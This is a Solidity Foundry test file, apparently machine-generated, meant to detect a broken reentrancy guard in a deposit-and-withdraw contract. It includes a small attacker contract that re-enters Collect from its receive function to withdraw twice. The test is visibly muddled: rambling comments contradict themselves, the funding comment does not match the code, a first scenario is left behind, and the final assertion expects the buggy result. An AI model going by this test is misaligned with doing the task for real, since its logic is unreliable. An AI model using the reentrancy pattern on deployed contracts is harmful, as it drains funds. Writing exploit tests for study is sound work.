// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;
import {Test} from "forge-std/Test.sol";
import {C} from "../src/C_under_test.sol";

contract InvMutTest is Test {
    C c;
    function setUp() public { c = new C(address(this)); }
    function testRegression_property() public {
        // Fund the contract with 1 ether
        vm.deal(address(c), 2 ether);
        // Set up user
        address user = address(0x1234);
        vm.deal(user, 1 ether);
        // User deposits 1 ether
        vm.prank(user);
        c.Put{value: 1 ether}(0);
        // Ensure unlockTime passed
        vm.warp(block.timestamp + 1 days);
        // User calls Collect(1 ether) - first call should succeed
        vm.prank(user);
        (bool success1, ) = address(c).call(abi.encodeWithSignature("Collect(uint256)", 1 ether));
        assertTrue(success1);
        // Now user calls Collect(0) - this should fail due to balance < MinSum
        vm.prank(user);
        (bool success2, ) = address(c).call(abi.encodeWithSignature("Collect(uint256)", 0));
        // Reference: balance after first Collect is 0, so second call fails (balance<1 ether)
        // Bug: due to removed nonReentrant, the second call might still succeed because 
        // the buggy nonReentrant modifier sets locked_=false before the function runs
        // Actually we need to check that on the reference the second call fails
        // and on the bug it succeeds. We'll test c.Acc(user).balance after both calls.
        (uint256 unlockTime, uint256 balance) = c.Acc(user);
        // In reference, balance should be 0 (only first Collect succeeded)
        // In bug, balance might be negative? No, sub_uint256 would revert. 
        // Let's make a concrete check: the second call's revert behavior.
        // Actually check that the second call reverts in reference.
        // Since we already made the calls, check balance:
        // For reference, balance should be 0 (the first Collect succeeded, second failed)
        // For bug, if nonReentrant is broken, the second Collect might also succeed? 
        // Bug: modifier is just `_; locked_ = false;` so no reentrancy protection.
        // But the function itself checks balance >= MinSum which is 1 ether.
        // After first Collect, balance becomes 0, so second Collect(0) will fail because
        // acc.balance >= MinSum is false (0 >= 1 ether false).
        // So both reference and bug would have balance=0 here.
        // We need a scenario where nonReentrant matters: 
        // Reentrancy via fallback when Collect sends ether.
        // Let's use a malicious contract that reenters.
        // Simpler: The difference is the nonReentrant modifier change.
        // The buggy modifier sets locked_=false before the function ends, allowing reentrancy.
        // So we need a reentrant call within Collect.
        // Let's deploy a simple reentrant contract.
        Reentrant attacker = new Reentrant(address(c));
        vm.deal(address(attacker), 1 ether);
        vm.prank(address(attacker));
        c.Put{value: 1 ether}(0);
        vm.warp(block.timestamp + 1 days);
        // Now attacker calls Collect(1 ether) which will trigger reentrancy
        vm.prank(address(attacker));
        try c.Collect(1 ether) {} catch {}
        // After reentrancy, check attacker's balance in c
        ( , uint256 balanceAfter) = c.Acc(address(attacker));
        // In reference (with proper nonReentrant), reentrant call will revert, so balance stays 1 ether
        // In bug, reentrant call succeeds and deducts again, making balance 0
        assertTrue(balanceAfter == 0, "Bug expected: reentrancy allowed double withdrawal");
    }
}

contract Reentrant {
    C c;
    bool public attacked;
    constructor(address _c) { c = C(_c); }
    receive() external payable {
        if (!attacked) {
            attacked = true;
            c.Collect(1 ether);
        }
    }
}

